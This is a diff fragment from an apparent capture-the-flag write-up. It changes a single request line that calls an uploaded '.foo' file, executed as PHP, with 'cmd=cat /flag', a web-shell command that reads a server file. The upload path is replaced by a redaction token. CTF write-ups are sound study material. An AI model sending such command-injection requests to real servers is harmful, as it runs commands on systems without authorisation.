@@ -63,7 +63,7 @@ After that we could execute files with the ".foo" extension as PHP files.
 
 Request:
 ```
-/uploads/831e75264dcb2b93527461c0608310f8/check.foo?cmd=cat%20/flag
+SECRET_REDACTED_BY_ANTIGRAVITY8/check.foo?cmd=cat%20/flag
 ```
 
 Flag:
